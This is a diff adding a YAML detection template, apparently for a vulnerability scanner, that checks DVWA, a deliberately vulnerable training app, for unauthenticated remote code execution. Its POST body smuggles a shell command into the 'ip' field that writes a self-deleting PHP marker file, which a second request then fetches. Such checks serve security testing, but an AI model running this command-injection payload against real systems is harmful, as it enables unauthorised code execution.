@@ -1,0 +1,23 @@
+name: poc-yaml-dvwa-unauth-rce
+set:
+  filename: randomLowercase(6)
+  r1: randomLowercase(10)
+rules:
+  - method: POST
+    path: /vulnerabilities/exec/source/low.php
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body:
+      ip=1%26echo%20%5E%3C%3Fphp%20echo%20md5({{r1}})%3Bunlink(__FILE__)%3B%3F%5E%3E%20%20%3E%20{{filename}}.php&Submit=1
+    follow_redirects: false
+    expression: |
+      response.status == 200
+  - method: GET
+    path: /vulnerabilities/exec/source/{{filename}}.php
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(md5(r1)))
+
+detail:
+  author: fuping
+  links:
+    - https://www.t00ls.net/viewthread.php?tid=62364
